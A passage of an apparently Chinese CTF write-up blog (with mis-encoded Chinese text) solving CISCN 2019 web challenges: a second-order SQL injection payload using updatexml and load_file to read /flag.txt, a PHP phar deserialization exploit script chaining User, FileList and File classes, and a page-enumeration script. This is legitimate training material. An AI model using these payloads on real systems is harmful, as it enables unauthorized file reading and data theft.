class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢å•åˆ é™¤æˆåŠŸ"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">$DATABASE = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">"host"</span> =&gt; <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="string">"username"</span> =&gt; <span class="string">"root"</span>,</span><br><span class="line">    <span class="string">"password"</span> =&gt; <span class="string">"root"</span>,</span><br><span class="line">    <span class="string">"dbname"</span> =&gt;<span class="string">"ctfusers"</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli($DATABASE[<span class="string">'host'</span>],$DATABASE[<span class="string">'username'</span>],$DATABASE[<span class="string">'password'</span>],$DATABASE[<span class="string">'dbname'</span>]);</span><br></pre></td></tr></table></figure>



<p><code>delete.php</code>è¿˜æœ‰<code>search.php</code>è¿™é‡Œå¯¹å‚æ•°éƒ½æœ‰ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ²¡æ³•è¿›è¡Œæ³¨å…¥</p>
<p>åœ¨change.phpä¸­æœ‰ä¸€ä¸ªaddresså‚æ•°æœªå¯¹å…¶è¿‡æ»¤ï¼Œä½†æ˜¯æœ‰å¯¹å…¶è¿›è¡Œè½¬ä¹‰å¤„ç†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$address = addslashes($_POST[<span class="string">"address"</span>]);</span><br></pre></td></tr></table></figure>

<p> è¿™é‡Œå­˜åœ¨ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥</p>
<p>ç¬¬ä¸€æ¬¡å¡«å†™ä¿®æ”¹åœ°å€çš„æ—¶å€™ï¼Œä¼šæŠŠåœ°å€å­˜å…¥æ•°æ®åº“ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹åœ°å€æ—¶ï¼Œç¬¬ä¸€æ¬¡çš„åœ°å€å°†ä¼šä½œä¸º<code>old_address</code>å‡ºç°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br></pre></td></tr></table></figure>

<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),1,20)),0x7e),1)#</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="image-20200306224202421"></p>
<p>æäº¤ä¸€ä¸ªè®¢å•</p>
<p><img src="/.com//7.png" alt="image-20200306224308864"></p>
<p>ç¬¬ä¸€æ¬¡ä¿®æ”¹åœ°å€ï¼Œé™„ä¸Špayload</p>
<p><img src="/.com//8.png" alt="image-20200306224622100"></p>
<p>ç¬¬äºŒæ¬¡ä¿®æ”¹åœ°å€ï¼Œå°±å¯ä»¥è·å¾—flag</p>
<p><code>load_file()</code>çš„é•¿åº¦ä¸å¤Ÿï¼Œæ‰€ä»¥åˆ†ä¸¤æ¬¡è¯»å–ï¼Œç¬¬äºŒæ¬¡é‡å¤æ­¤æ“ä½œå°±å¥½ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),20,40)),0x7e),1)#</span></span><br></pre></td></tr></table></figure>



<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>è¿™ä¸€é¢˜ï¼Œæˆ‘ä»¬é€šè¿‡æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»åˆ°æ‰€æœ‰çš„æºç </p>
<p>æ³¨å†Œç™»å½•åï¼Œåˆ°ä¸‹è½½é¡µé¢</p>
<p><img src="/.com//9.png" alt="image-20200311103044956"></p>
<p>åœ¨ä¸‹è½½å¤„å¯ä»¥ä¸‹è½½æ–‡ä»¶</p>
<p><img src="/.com//10.png" alt="image-20200311103142130"></p>
<p>è·å¾—æ‰€æœ‰çš„æ–‡ä»¶</p>
<p><img src="/.com//11.png" alt="image-20200311103219856"></p>
<p>å®¡è®¡ä»£ç ï¼Œåœ¨<code>download.php</code>å’Œ<code>delete.php</code>ï¼Œä¸­å‡æœ‰è§¦å‘<code>pharååºåˆ—åŒ–æ¼æ´</code>çš„ä»£ç </p>
<p>å‡è°ƒç”¨äº†<code>$file-&gt;open($filename)</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>is_dir()</code>å¯è§¦å‘<code>pharååºåˆ—åŒ–æ¼æ´</code></p>
<p>ç„¶åè°ƒç”¨é“¾çœ‹åˆ°<code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href="#" class="delete"&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>åœ¨<code>Fileç±»</code>ä¸­çœ‹åˆ°äº†<code>close()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥åšæ–‡ä»¶è¯»å–ï¼Œè¯»å–æ–‡ä»¶<code>/flag.txt</code></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è§£é‡Šä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶åœ¨<code>$a</code>ä¸­æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç”±äº<code>FileListç±»</code>ä¸­æ²¡æœ‰<code>close()</code>æ–¹æ³•ï¼Œæ‰€ä»¥è¿™æ—¶å€™å°†ä¼šè°ƒç”¨è¯¥ç±»ä¸­çš„<code>_call()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°ï¼Œå°±æ˜¯éå†<code>$files</code>ä¸­çš„å…ƒç´ æŒ‡å®šä¸º<code>$file</code>ï¼ŒæŠŠåœ¨è¯¥ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•<code>$func</code>åœ¨<code>$file</code>ä¸­è°ƒç”¨</p>
<p>æ ¹æ®expï¼Œå³è°ƒç”¨<code>$file = new File();$this-&gt;results[File][close] = $file-&gt;close();</code></p>
<p>è°ƒç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»åˆ°flagã€‚</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p><img src="/.com//30.py" alt="image-20200311112214949"></p>
<p>é¢˜ç›®æç¤ºè¦ä¹°<code>lv6</code></p>
<p><img src="/.com//13.png" alt="image-20200311112438955"></p>
<p>é€‰é¡¹å¾ˆå¤šï¼Œä¸çŸ¥é“<code>lv6</code>åœ¨å“ªå„¿</p>
<p>å†™ä¸ªè„šæœ¬çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ca99e050-50bd-40c0-a6b4-413286d31bb6.node3.buuoj.cn/shop?page=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	re = requests.get(url.format(str(i)))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> re.text:</span><br><span class="line">		print(<span class="string">"----------------------------"</span>)</span><br><span class="line">		print(i)</span><br><span class="line">		print(<span class="string">"----------------------------"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">"no &#123;&#125;"</span>.format(str(i)))</span><br></pre></td></tr></table></figure>

<p>åœ¨181é¡µ</p>
<p><img src="/.com//14.png" alt="image-20200311122114521"></p>
<p>è´­ä¹°è¿™ä¸ªé¡¹ç›®ï¼Œç„¶ååˆ°è´­ä¹°é¡µé¢</p>
<p><img src="/.com//15.png" alt="image-20200311124753255"></p>
<p>è¿™é‡Œæœ‰éœ€è¦æ‰“æŠ˜æ‰£ï¼ŒæŠ“åŒ…ä¿®æ”¹æŠ˜æ‰£ã€‚</p>
